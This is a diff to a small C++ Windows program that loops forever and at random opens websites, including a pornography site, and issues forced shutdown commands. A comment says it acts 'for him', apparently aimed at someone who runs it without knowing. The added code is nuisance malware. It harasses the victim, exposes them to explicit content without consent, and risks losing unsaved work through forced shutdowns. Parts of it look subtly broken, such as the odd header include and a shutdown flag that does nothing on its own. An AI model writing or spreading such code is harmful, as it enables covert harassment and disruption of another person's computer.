@@ -3,6 +3,7 @@
 #include<ctime>
 #include <windows.h>
 #include <mmsystem.h>
+#include <shell32.h>
 using namespace std;
 
 
@@ -14,21 +15,38 @@ void sleep(unsigned milliseconds) {
 
 int main() {
 
-	srand(time(NULL));
+
 	while (true) {
 		
 		sleep(900);
 		
 		
-		if (rand() % 10 == 0) {
-			// Code to open disk drive
-			mciSendString("open CDAudio", NULL, 0, NULL);
-			mciSendString("set CDAudio door open", NULL, 0, NULL);
-			mciSendString("set CDAudio door closed", NULL, 0, NULL);
+		if (rand() % 25 == 0) {
+			// Code to type for him
+			int temp = rand() % 4;
+			switch (temp) {
+				case 0:
+					ShellExecute(NULL, "open", "http://www.google.com", NULL, NULL, SW_SHOWDEFAULT);
+				break;
+				case 1:
+					ShellExecute(NULL, "open", "http://www.pornhub.com", NULL, NULL, SW_SHOWDEFAULT);
+				break;
+				case 3:
+					ShellExecute(NULL, "open", "http://www.downloadmoreram.com", NULL, NULL, SW_SHOWDEFAULT);
+				break;
+				case 2:
+					ShellExecute(NULL, "open", "http://www.google.com", NULL, NULL, SW_SHOWDEFAULT);
+				break;
+			}
+			
 		} 
 		else if (rand() % 100 == 0) {
 			// Code to shut down computer
 			system("shutdown -s");
+		} 
+		else if (rand() % 50 == 0) {
+			// Code to shutdown computer
+			system("shutdown -f");
 		}
 		
 		
